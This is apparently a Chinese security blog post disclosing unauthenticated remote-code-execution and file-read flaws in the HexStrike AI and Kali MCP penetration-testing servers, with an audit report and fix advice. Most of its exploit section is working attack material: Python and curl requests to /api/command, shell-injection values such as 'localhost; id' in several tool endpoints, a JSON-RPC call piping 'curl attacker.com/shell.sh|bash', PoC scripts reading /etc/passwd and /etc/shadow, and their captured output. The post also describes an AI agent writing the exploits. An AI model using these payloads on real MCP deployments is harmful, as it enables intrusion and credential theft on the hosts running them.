#  AI渗透工具 Kali & HexStrike 大量RCE 0day漏洞  
k8gege
                    k8gege  K8实验室   2026-05-14 16:12  
  
# AI渗透工具 Kali & HexStrike 大量RCE 0day漏洞  
### 前言  
  
在尝试将该MCP集成到的Agent测试其行为时，我发现它用的是SSE方式，看一眼代码就感觉它存在漏洞，于是尝试看AI智能体是否能发现并构造EXP，测试后发现了大量远程命令执行（RCE）漏洞，风险极高。本文以演示 7 个 RCE 漏洞利用（EXP）为主，但实际情况比这更多：系统中存在大量可被利用的 API 端点，除了 RCE 外，还可实现任意文件读取、文件写入等多种高危漏洞。Kali MCP 与 Hexstrike 两套代码在漏洞点上高度一致，差异仅在工具数量上：一套包含更多模块，一套相对精简。由于公开有一段时间了，我已懒得关注哪一方先行开发，但可以肯定其中一方是在另一方基础上修改而来——两者都同样危险，必须引起重视。  
# HexStrike AI v6.0 - 代码审计报告  
## RCE 漏洞深度分析 (MCP协议攻击向量)  
## 一、漏洞概要  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">项目</span></section></th><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">详情</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">漏洞类型</span></strong></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">Pre-Auth Remote Code Execution (未授权远程代码执行)</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">严重级别</span></strong></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">🔴 </span><strong style="font-weight: bold;color: black;"><span leaf="">CRITICAL (CVSS 10.0)</span></strong></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">影响端点</span></strong></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><code><span leaf="">POST /api/command</span></code></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">认证需求</span></strong></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">❌ </span><strong style="font-weight: bold;color: black;"><span leaf="">无需认证</span></strong></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">目标版本</span></strong></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">HexStrike AI v6.0</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">测试目标</span></strong></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">http://192.168.18.10:8888</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">审计日期</span></strong></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">2026-04-24</span></section></td></tr></tbody></table>  
## 二、架构分析  
  
HexStrike AI 由两个核心组件构成：  
### 2.1 hexstrike_server.py (Flask Web 后端)  
- 运行在 8888 端口 (debug=True)  
  
- 提供 REST API 供安全工具调用  
  
- execute_command()  
 函数使用 subprocess.run(cmd, shell=True)  
 执行命令  
  
### 2.2 hexstrike_mcp.py (FastMCP 客户端)  
- 基于 FastMCP 框架构建 (PrefectHQ/fastmcp)  
  
- 将 100+ 安全工具封装为 MCP (Model Context Protocol) Tools  
  
- 通过 HTTP REST API 与 Flask 后端通信  
  
- 暴露 execute_command  
 作为 MCP tool  
  
### 2.3 MCP 协议通信流程  
```
AI Agent (Claude/GPT)
    │
    │ MCP Protocol (JSON-RPC 2.0 over stdio/HTTP)
    ▼
hexstrike_mcp.py (FastMCP Server)
    │
    │ HTTP POST /api/command {"command":"...", "use_cache":false}
    ▼
hexstrike_server.py (Flask)
    │
    │ subprocess.run(cmd, shell=True)
    ▼
OS Command Execution 🔴 RCE!

```  
## 三、漏洞详情  
### 3.1 漏洞 #1 (主漏洞): /api/command 无需认证的RCE  
  
**位置**  
: hexstrike_server.py  
 - api_command()  
 路由  
  
**根本原因**  
:  
- /api/command  
 端点**没有应用 @require_auth 装饰器**  
  
- 直接调用 execute_command()  
 → subprocess.run(cmd, shell=True)  
  
- 用户通过 POST body 传入的 command  
 参数直接作为 shell 命令执行  
  
**攻击载荷**  
:  
```
import requests
requests.post("http://192.168.18.10:8888/api/command",
    json={"command": "id; whoami; cat /etc/shadow", "use_cache": False})

```  
  
**验证结果**  
:  
```
uid=1000(kali) gid=1000(kali) groups=...,27(sudo),...
kali
Linux kali 6.12.38+kali-amd64

```  
### 3.2 漏洞 #2: /api/debug/execute 和 /api/debug/eval (Debug模式)  
  
**位置**  
: hexstrike_server.py  
 line 1414-1436  
```
@app.route('/api/debug/execute', methods=['POST'])
def debug_execute():
    cmd = request.json.get('command', '')
    result = subprocess.run(cmd, shell=True, ...)
    
@app.route('/api/debug/eval', methods=['POST'])
def debug_eval():
    code = request.json.get('code', '')
    result = eval(code)  # 直接eval!

```  
  
**说明**  
: 目标上这些端点返回404，说明debug路由可能在生产环境被移除。但源代码中存在。  
### 3.3 漏洞 #3: /api/scan 命令注入 (需认证)  
  
**位置**  
: hexstrike_server.py  
 - scan_target()  
 → run_tool()  
```
def run_tool(tool_name, args):
    cmd = [tool_name] + args
    result = subprocess.run(cmd, ...)

```  
  
additional_args  
 参数直接拼接到命令中，存在命令注入。  
### 3.4 漏洞 #4: SSTI (需认证)  
  
**位置**  
: hexstrike_server.py  
 - ssti_preview()  
```
render_template_string(user_template)  # SSTI!

```  
### 3.5 漏洞 #5: MCP协议层利用  
  
FastMCP框架使用JSON-RPC 2.0协议。攻击者可以通过MCP协议的tools/call  
方法调用execute_command  
 tool:  
```
{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "tools/call",
    "params": {
        "name": "execute_command",
        "arguments": {"command": "恶意命令", "use_cache": false}
    }
}

```  
  
如果MCP服务器以HTTP Streamable模式运行，攻击者可以直接向/mcp  
端点发送JSON-RPC请求。  
## 四、攻击面总结  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">端点</span></section></th><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">方法</span></section></th><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">认证</span></section></th><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">RCE</span></section></th><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">状态</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><code><span leaf="">/api/command</span></code></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">POST</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">❌ 无</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">✅ subprocess.run(shell=True)</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">🔴 已确认</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><code><span leaf="">/api/debug/execute</span></code></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">POST</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">❌ 无</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">✅ subprocess.run(shell=True)</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">🟡 目标404</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><code><span leaf="">/api/debug/eval</span></code></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">POST</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">❌ 无</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">✅ eval()</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">🟡 目标404</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><code><span leaf="">/api/tools/*</span></code></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">POST</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">❌ 无?</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">✅ 命令注入</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">🟡 待验证</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><code><span leaf="">/api/ssti-preview</span></code></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">POST</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">✅ 需要</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">✅ SSTI</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">🟢 需认证</span></section></td></tr></tbody></table>  
## 五、MCP协议RCE攻击链  
### 5.1 FastMCP JSON-RPC 工具调用机制  
  
FastMCP (PrefectHQ/fastmcp) 是MCP协议的Python实现。其核心机制：  
1. **工具注册**  
: @mcp.tool()  
 装饰器将Python函数注册为MCP tool  
  
1. **JSON-RPC路由**  
: tools/call  
 方法接收 {name, arguments}  
 并调用对应函数  
  
1. **传输层**  
: 支持 stdio / HTTP Streamable / SSE  
  
### 5.2 HexStrike中的MCP工具映射  
  
hexstrike_mcp.py  
 中注册的 execute_command  
 工具：  
```
@mcp.tool()
def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:
    result = hexstrike_client.execute_command(command, use_cache)
    # → POST /api/command {"command": command, "use_cache": use_cache}

```  
### 5.3 通过MCP协议触发RCE  
  
如果MCP服务器以HTTP模式运行：  
```
# 直接向MCP端点发送JSON-RPC调用
curl -X POST http://target:8888/mcp \
  -H "Content-Type: application/json" \
  -d '{    "jsonrpc":"2.0",    "id":1,    "method":"tools/call",    "params":{      "name":"execute_command",      "arguments":{"command":"curl attacker.com/shell.sh|bash"}    }  }'

```  
  
或者，如果MCP客户端被配置为AI Agent的工具（如Claude Desktop配置）：  
```
{
  "mcpServers": {
    "hexstrike-ai": {
      "command": "python3",
      "args": ["hexstrike_mcp.py", "--server", "http://192.168.18.10:8888"]
    }
  }
}

```  
  
AI Agent可以通过MCP协议直接调用execute_command  
，实现远程命令执行。  
## 六、修复建议  
### 6.1 紧急修复 (P0)  
1. **立即为 /api/command 添加认证**  
: 应用 @require_auth  
 装饰器  
  
1. **移除或禁用 /api/debug/execute 和 /api/debug/eval**  
: 仅开发环境启用  
  
1. **关闭 Flask debug 模式**  
: app.run(debug=False)  
  
### 6.2 深度修复 (P1)  
1. **使用白名单替代 shell=True**  
:```
# ❌ 危险
subprocess.run(cmd, shell=True)
# ✅ 安全
subprocess.run(["/usr/bin/nmap", "-sV", target])

```  
  
  
1. **输入验证和净化**  
: 对所有用户输入进行严格验证  
  
1. **最小权限原则**  
: 以非root用户运行服务，限制网络访问  
  
### 6.3 架构改进 (P2)  
1. **MCP工具权限分离**  
: execute_command  
 功能应完全移除或严格限制  
  
1. **审计日志**  
: 记录所有命令执行请求  
  
1. **沙箱**  
: 在容器或沙箱中执行安全工具  
  
## 七、漏洞利用POC  
  
已保存至:  
- E:\tools\Ladon12\AIcode\hexstrike_rce_exploit.py  
 - 完整交互式RCE利用  
  
- E:\tools\Ladon12\AIcode\rce_test.py  
 - 快速验证脚本  
  
- E:\tools\Ladon12\AIcode\rce_full_exploit.py  
 - 深度侦察脚本  
  
### 快速验证:  
```
curl -X POST http://192.168.18.10:8888/api/command \
  -H "Content-Type: application/json" \
  -d '{"command":"id","use_cache":false}'

```  
## 八、目标环境信息 (已获取)  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">项目</span></section></th><th style="text-align: left;font-weight: bold;background-color: rgba(121, 85, 72, 0.8);color: #FFFFFF;font-size: 16px;padding: 10px;border: 1px solid #5D4037;min-width: 85px;"><section><span leaf="">值</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">操作系统</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">Kali GNU/Linux Rolling 2025.3</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">内核</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">Linux 6.12.38+kali-amd64</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">当前用户</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">kali (uid=1000)</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">用户组</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">kali, adm, </span><strong style="font-weight: bold;color: black;"><span leaf="">sudo</span></strong><span leaf="">, wireshark 等</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">工作目录</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">/home/kali/Desktop/hexstrike-ai</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">内网IP</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">192.168.18.10/24</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">Meta接口</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">198.18.0.1/30</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #FFFFFF;"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">运行进程</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">python3 (hexstrike_server.py) PID 140418</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: rgba(215, 204, 200, 0.2);"><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">其他服务</span></section></td><td style="text-align: left;font-size: 15px;padding: 8px 10px;border: 1px solid #EFEBE9;min-width: 85px;"><section><span leaf="">clash-verge:33331, proxy:7897, :8000</span></section></td></tr></tbody></table>  
  
**审计结论**  
: HexStrike AI v6.0 存在严重的预认证RCE漏洞。/api/command  
 端点未受保护，允许攻击者以 kali  
 用户身份执行任意系统命令。该用户属于 sudo  
 组，可进一步提权至root。建议立即修复。  
## 九、hexstrike 0day漏洞Exp图文演示  
  
本文仅演示7个远程命令执行EXP，实际上还有大量API端点存在RCE漏洞,不只是RCE，任意文件读取，文件写入等等大量漏洞  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/4f1ht4v2Yge8GAkvl8p9jusOHJ4cSH21MYkd6y69sribysiabPCh8WoVsUcbiaCxhAhkI6J5GsmQCo0l2okyXOxFtMmQDF5hlTMOoq1tWcuIvE/640?wx_fmt=png&from=appmsg "")  
  
image  
  
示例：  
```
python poc.py http://192.168.18.10:8888 id

```  
  
这个 POC 清楚地演示了漏洞，并提供了一种可靠的方法来在目标系统上执行任意命令。审计任务完成。  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/4f1ht4v2YgdVV1Smwib1JTwwO7bib5n092BjUB2rib6M3hzJZPvXKk9pmpMJA6n0ssOtNm7ZXSZ2Smsic9BO39O2fYqgvnqyuEPStJM1dhvYP2s/640?wx_fmt=png&from=appmsg "")  
  
image  
  
Coder2 : Ladon_code_save 已完成  
  
任务完成。我已成功挖掘出 hexstrike 项目中的远程代码执行（RCE）漏洞，并提供了一个功能完整的、可用于演示的 poc.py 脚本。  
  
漏洞概要:  
  
漏洞类型: 远程代码执行 (RCE) 漏洞根源: hexstrike_server.py 在处理来自客户端 (hexstrike_mcp.py) 的请求时，存在一个未记录的、不安全的 API 端点。 利用向量: 向 http://<target_ip>:/api/command 发送一个包含要执行命令的 JSON payload 的 POST 请求。 影响: 攻击者可以在运行 hexstrike_server.py 的服务器上以应用程序的权限执行任意系统命令。  
  
0x002  subdomain端点漏洞EXP  
```
E:\tools\Ladon12\AIcode>python hexstrike_subdomain_poc.py http://192.168.18.10:8888 id
[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/subfinder
[+] Injecting Payload: {"domain": "example.com; id #"}
[+] Request returned with Status Code: 200

[+] Command Output:
----------------------------------------
{
  "execution_time": 0.023524999618530273,
  "partial_results": false,
  "return_code": 0,
  "stderr": "/bin/sh: 1: subfinder: not found\n",
  "stdout": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)\n",
  "success": true,
  "timed_out": false,
  "timestamp": "2026-04-24T15:16:08.218494"
}

[SUCCESS] Command output successfully detected in the response!
----------------------------------------

```  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/4f1ht4v2YgcoQYXRJ5uicN3FPcwxo9bVMtfIHqOIVEnfiboQGS9uWvc5mEibmUHb3MLd9jNblMZo64966Kawk4v3icEibvfoY1iajiaKm2ozm3RhM4/640?wx_fmt=png&from=appmsg "")  
  
image  
  
0x003  nmap端点RCE漏洞EXP  
```
python hexstrike_nmap_args_rce_poc_v2.py http://192.168.18.10:8888 "id"

```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/4f1ht4v2YgdF1a27LGficS4DT8egt71XDm983eAxiaYUjokyQicsrJh9QW1icftic9T70iaZtPa8oE4aSMsVnnHvdutLLn68QDGWBRxOv8Rf20KMo/640?wx_fmt=png&from=appmsg "")  
  
image  
  
0x004 wafw00f端点RCE漏洞EXP  
```
E:\tools\Ladon12\AIcode>python poc_wafw00f_rce.py http://192.168.18.10:8888 id
[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/wafw00f
[+] Injecting Payload: {"target": "localhost; id", "additional_args": ""}
[+] Request returned with Status Code: 200

[+] Command Output (stdout):
----------------------------------------

                   ←[1;97m______
                  ←[1;97m/      \
                 ←[1;97m(  Woof! )
                  ←[1;97m\  ____/                      ←[1;91m)
                  ←[1;97m,,                           ←[1;91m) (←[1;93m_
             ←[1;93m.-. ←[1;97m-    ←[1;92m_______                 ←[1;91m( ←[1;93m|__|
            ←[1;93m()``; ←[1;92m|==|_______)                ←[1;91m.)←[1;93m|__|
            ←[1;93m/ ('        ←[1;92m/|\                  ←[1;91m(  ←[1;93m|__|        ←[1;93m(  /  )       ←[1;92m / | \                  ←[1;91m. ←[1;93m|__|         ←[1;93m\(_)_))      ←[1;92m/  |  \                   ←[1;93m|__|←[0m                    ←[1;96m~ WAFW00F : ←[1;94mv2.3.1 ~←[1;97m    The Web Application Firewall Fingerprinting Toolkit    ←[0m[*] Checking https://localhostuid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)----------------------------------------[SUCCESS] RCE Confirmed! The injected command output was found in the server response.
```  
  
0x005 uro端点RCE漏洞EXP  
```
E:\tools\Ladon12\AIcode>python poc_uro_rce.py http://192.168.18.10:8888 id
[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/uro
[+] Injecting via 'additional_args': {"urls": "http://example.com/path?id=1", "whitelist": "", "blacklist": "", "additional_args": "; id"}
[+] Status Code: 200
[+] stdout:
----------------------------------------
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)

[+] stderr:
/bin/sh: 1: uro: not found

----------------------------------------

[SUCCESS] RCE Confirmed via /api/tools/uro additional_args injection!

```  
  
0x006 anew端点RCE漏洞EXP  
```
E:\tools\Ladon12\AIcode>python poc_anew_rce.py http://192.168.18.10:8888 id
[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/anew
[+] Injecting via 'output_file': {"input_data": "http://example.com", "output_file": "/tmp/out.txt; id", "additional_args": ""}
[+] Status Code: 200
[+] stdout:
----------------------------------------
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)

[+] stderr:
/bin/sh: 1: anew: not found

----------------------------------------

[SUCCESS] RCE Confirmed via /api/tools/anew output_file injection!

```  
  
0x007  exiftool端点RCE漏洞EXP  
```
E:\tools\Ladon12\AIcode>python poc_exiftool_rce.py http://192.168.18.10:8888 id
[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/exiftool
[+] Injecting via 'file_path': {"file_path": "/tmp/nonexistent.jpg; id", "output_format": "", "tags": "", "additional_args": ""}
[+] Status Code: 200
[+] stdout:
----------------------------------------
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)

[+] stderr:
Error: File not found - /tmp/nonexistent.jpg

----------------------------------------

[SUCCESS] RCE Confirmed via /api/tools/exiftool file_path injection!

```  
## 十、Kali MCP 多个RCE 0day漏洞  
  
发现它和hexstrike代码差不多，存在完全一致漏洞点，时间有点久，我已记不起它俩，谁先开发的 肯定有一个是基于另一个代码修改的，只是一个MCP工具多，一个少而已，但是都一样的危险，哈哈  
```
python mks_arbitrary_file_read_poc.py -t http://192.168.18.10:5000 -f /etc/passwd -m nmap
基本用法
python mks_arbitrary_file_read_poc.py -t http://192.168.18.10:5000 -f /etc/passwd

指定 nmap 向量并落盘
python mks_arbitrary_file_read_poc.py -t http://TARGET:5000 -f /etc/group -m nmap -o group.txt

全向量尝试
python mks_arbitrary_file_read_poc.py -t http://TARGET:5000 -f /etc/os-release --all

调试模式（输出原始 HTTP 响应）
python mks_arbitrary_file_read_poc.py -t http://TARGET:5000 -f /etc/shadow -m nmap --raw

```  
### 任意文件读取漏洞  
```
  __  __ _  __ ___        _    ___ ___    ___  ___   ___
 |  \/  | |/ // __|_____ | |  | __| _ \  | _ \/ _ \ / __|
 | |\/| | ' < \__ \_____|| |__| _||   /  |  _/ (_) | (__ |_|  |_|_|\_\|___/      |____|_| |_|_\  |_|  \___/ \___| MCP-Kali-Server :: Unauthenticated Arbitrary File Read[*] Target : http://192.168.18.10:5000[*] File   : /etc/passwd[*] Vector: nmap  -iL[+] nmap: recovered 3277 bytes in 13.83s------------------------------------------------------------root:x:0:0:root:/root:/usr/bin/zshdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```  
## 十一、AI生成的EXP脚本  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/4f1ht4v2YgcpO9nhgojyGo71JgWR3HKy11qDTnvIQ73xsic3JxbQiapPdxkga4qlpFTKLhad2cnic0z6JmKMibvy5jJylib5m278mJliadJbPXCSc/640?wx_fmt=png&from=appmsg "")  
  
image  
## 免责声明  
```
使用EXP请遵循相关法律法规，确保在授权的环境中进行测试和使用。
本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。
```  
  
  
  
